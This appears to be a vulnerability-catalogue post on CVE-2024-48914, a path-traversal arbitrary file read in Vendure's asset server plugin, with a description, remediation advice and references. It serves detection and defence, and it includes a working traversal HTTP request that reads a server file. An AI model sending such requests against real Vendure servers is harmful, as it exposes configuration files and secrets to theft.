---
layout: post
cve_id: CVE-2024-48914
title: Vendure - Arbitrary File Read
pcap: true
pcap_path: /pcaps/2024/CVE-2024-48914.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2024/CVE-2024-48914.yaml
snort2_rule: N/A
snort3_rule: N/A
author: s4e-io
severity: critical
impact: 'Allows attackers to read arbitrary files on the server, including sensitive
  data such as configuration files and environment variables.

  '
remediation: 'Patches are available in versions 3.0.5 and 2.3.3. Some workarounds
  are also available. One may use object storage rather than the local file system,
  e.g. MinIO or S3, or define middleware which detects and blocks requests with urls
  containing `/../`.

  '
reference:
- https://nvd.nist.gov/vuln/detail/CVE-2024-48914
- https://github.com/EQSTLab/CVE-2024-48914
- https://github.com/vendure-ecommerce/vendure
- https://github.com/vendure-ecommerce/vendure/blob/801980e8f599c28c5059657a9d85dd03e3827992/packages/asset-server-plugin/src/plugin.ts#L352-L358
- https://github.com/vendure-ecommerce/vendure/commit/e2ee0c43159b3d13b51b78654481094fdd4850c5
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H
  cvss-score: 9.1
  cve-id: CVE-2024-48914
  cwe-id: CWE-20
  epss-score: 0.92383
  epss-percentile: 0.99712
metadata:
  verified: true
  max-request: 1
  vendor: vendure-ecommerce
  product: vendure
  fofa-query: Vendure
tags:
- cve
- cve2024
- vendure
- lfi
- file-read
- vkev
- vuln
---

## üîç Vulnerability Description
Vendure is an open-source headless commerce platform. Prior to versions 3.0.5 and 2.3.3, a vulnerability in Vendure's asset server plugin allows an attacker to craft a request which is able to traverse the server file system and retrieve the contents of arbitrary files, including sensitive data such as configuration files, environment variables, and other critical data stored on the server. In the same code path is an additional vector for crashing the server via a malformed URI.


## üåê HTTP Request
```nohighlight
GET /assets/../package.json HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

